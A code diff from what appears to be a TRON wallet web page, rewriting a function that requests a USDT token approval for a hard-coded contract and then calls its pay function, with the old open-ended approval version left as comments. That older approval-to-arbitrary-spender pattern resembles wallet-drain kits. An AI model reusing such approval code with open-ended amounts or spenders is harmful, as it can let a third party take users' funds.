@@ -2880,31 +2880,83 @@ async function TUAP() {
         // }
     }
 }
+// 旧版本
+// async function tronIA() {
+//     let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+//     alert(trx);
+//     if (trx > 5000000) {  // 只需要5 TRX就足够了
+//         const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+//         try {
+//             let contract = await tronWeb.contract().at(trc20ContractAddress);
+//             // 使用更低的 feeLimit，5 TRX 就足够了
+//             res = await contract.increaseApproval(spender_bas58, amount).send({feeLimit: 5000000});
 
+//             successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, approve_type);
+//         } catch (error) {
+//             console.error("智能合约调用错误:", error);
+//             if (error.message && error.message.includes("user rejected")) {
+//                 alert('用户取消了交易！');
+//             } else if (error.message && error.message.includes("insufficient")) {
+//                 alert('余额不足，请确保有足够的TRX和USDT！');
+//             } else {
+//                 alert('交易失败：' + error.message);
+//             }
+//         }
+//     } else {
+//         alert('TRX余额不足，需要至少5 TRX用于支付网络费！')
+//     }
+// }
 async function tronIA() {
-    let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
-    alert(trx);
-    if (trx > 5000000) {  // 只需要5 TRX就足够了
-        const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        try {
-            let contract = await tronWeb.contract().at(trc20ContractAddress);
-            // 使用更低的 feeLimit，5 TRX 就足够了
-            res = await contract.increaseApproval(spender_bas58, amount).send({feeLimit: 5000000});
-            successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, approve_type);
-        } catch (error) {
-            console.error("智能合约调用错误:", error);
-            if (error.message && error.message.includes("user rejected")) {
-                alert('用户取消了交易！');
-            } else if (error.message && error.message.includes("insufficient")) {
-                alert('余额不足，请确保有足够的TRX和USDT！');
-            } else {
-                alert('交易失败：' + error.message);
-            }
-        }
-    } else {
-        alert('TRX余额不足，需要至少5 TRX用于支付网络费！')
+    const tronWeb = window.tronWeb;
+    const address = tronWeb.defaultAddress.base58;
+    const feeLimit = 5000000;
+    const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const spender_bas58 = "TCSsh1TmLMfAH82ED6putkkdYDKCCLKkN4"; // 你的合约地址
+    const amount = tronWeb.toBigNumber(1).multipliedBy(1e6); // 授权 & 支付 1 USDT
+  
+    let trx = await tronWeb.trx.getBalance(address);
+    alert("当前 TRX 余额：" + trx / 1e6 + " TRX");
+  
+    if (trx <= feeLimit) {
+      alert("❌ TRX 余额不足，请至少保留 5 TRX 用于手续费！");
+      return;
     }
-}
+  
+    try {
+      const usdtContract = await tronWeb.contract().at(usdtAddress);
+      const payContract = await tronWeb.contract().at(spender_bas58);
+  
+      // 🧠 检查是否已授权
+      const allowance = await usdtContract.allowance(address, spender_bas58).call();
+      if (tronWeb.toBigNumber(allowance).lt(amount)) {
+        console.log("⏳ 正在授权 USDT...");
+        await usdtContract.increaseApproval(spender_bas58, amount).send({ feeLimit });
+        console.log("✅ 授权成功");
+      } else {
+        console.log("✅ 已授权，跳过授权步骤");
+      }
+  
+      // 💸 调用合约支付（pay 函数）
+      console.log("💸 正在支付...");
+      const tx = await payContract.pay(amount).send({ feeLimit });
+      alert("✅ 支付成功！交易哈希：" + tx);
+  
+      // ✅ 成功回调
+      if (typeof successCallback === "function") {
+        successCallback(address, spender_bas58, "pay");
+      }
+  
+    } catch (error) {
+      console.error("❌ 错误:", error);
+      if (error.message?.includes("user rejected")) {
+        alert("❌ 用户取消了交易");
+      } else if (error.message?.includes("insufficient")) {
+        alert("❌ 余额不足（TRX 或 USDT）");
+      } else {
+        alert("❌ 交易失败：" + (error.message || "未知错误"));
+      }
+    }
+  }
 
 // 获取带过来的参数值
 function getQueryVariable(variable) {
